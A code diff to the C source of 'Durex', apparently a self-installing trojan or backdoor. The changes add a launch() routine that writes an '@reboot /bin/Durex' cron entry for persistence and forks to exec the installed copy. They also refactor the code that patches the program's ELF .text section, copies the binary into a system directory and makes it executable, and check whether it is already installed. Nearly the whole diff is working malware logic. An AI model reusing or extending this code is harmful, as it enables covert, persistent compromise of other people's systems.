@@ -1,9 +1,47 @@
-#include "payload.h"
+#include "durex.h"
 
 #include <stdio.h>
 
 int			g_fd;
 int			g_sock;
+
+static int		launch(void)
+{
+	pid_t		pid;
+	int		fd;
+	struct stat	st;
+	char		*buf;
+	char		cron[] = "@reboot /bin/Durex";
+	
+	if ((fd = open(PATH_CRON, O_RDWR | O_CREAT, 0600)) == -1)
+		return (1);
+	if (fstat(fd, &st) == -1)
+		goto error;
+	if ((buf = (char*)malloc(sizeof(char)*st.st_size)) == NULL)
+		goto error;
+	read(fd, buf, st.st_size);
+	if ((strstr(buf, cron) != NULL))
+		goto error_free;
+	lseek(fd, 0, SEEK_END);
+	write(fd, cron, 18);
+	free(buf);
+	close(fd);
+start:
+	pid = fork();
+	if (pid < 0)
+		goto error_free;
+	if (pid == 0)
+	{
+		if ((execl(PATH_BIN_EXEC, "", NULL)) < 0)
+			exit (EXIT_FAILURE);
+	}
+	return (0);
+error_free:
+	free(buf);
+error:
+	close(fd);
+	goto start;
+}
 
 static void		sig_handler(const int signo)
 {
@@ -35,7 +73,6 @@ static int		elf_parsing(void *file, int f_size)
 	Elf64_Shdr	*strtab;
 	const char	*addr_strtab;
 	int		fd;
-	char		path[] = "/bin/durex";
 
 	main_header = (Elf64_Ehdr *)file;
 	header = (Elf64_Shdr*)(file + main_header->e_shoff);
@@ -45,11 +82,11 @@ static int		elf_parsing(void *file, int f_size)
 	{
 		if (strcmp(".text", addr_strtab + header[i].sh_name) == 0)
 		{
-			memset(file + header[i].sh_offset + header[i].sh_size - 0x20D, '\0', 4);
-			if ((fd = open(path, O_CREAT | O_WRONLY)) < 0)
+			memset(file + header[i].sh_offset + header[i].sh_size - 0x232, '\0', 4);
+			if ((fd = open(PATH_BIN, O_CREAT | O_WRONLY)) < 0)
 				return (1);
 			write(fd, file, f_size);
-			chmod(path, S_IXUSR);
+			chmod(PATH_BIN, S_IXUSR);
 			close(fd);
 			return (0);
 		}
@@ -83,10 +120,10 @@ static int		check_present(void)
 	struct dirent		*file;
 	DIR			*directory;
 
-	if ((directory = opendir("/bin")) == NULL)
+	if ((directory = opendir(PATH_BIN)) == NULL)
 		goto error;
 	while ((file = readdir(directory)))
-		if (!(strcmp(file->d_name, "durex")))
+		if (!(strcmp(file->d_name, BIN_NAME)))
 			goto error;
 	closedir(directory);
 	return (0);
@@ -105,17 +142,20 @@ int			main(int argc, char **argv)
 
 	(void)argc;
 	in_durex = 1;
-	if ((check_credentials()) != 0)
-		return (EXIT_FAILURE);
 	if (in_durex)
 	{
 		write(STDIN_FILENO, "pnardozi\n", 9); 
+		if ((check_credentials()) != 0)
+			return (EXIT_FAILURE);
 		if (check_present())
 			return (0);
-		copy_file(argv[0]);
+		if ((copy_file(argv[0])) == 0)
+			launch();
 	}
 	else
 	{
+		if ((check_credentials()) != 0)
+			return (EXIT_FAILURE);
 		g_fd = 0;
 		g_sock = 0;
 		fd = 0;
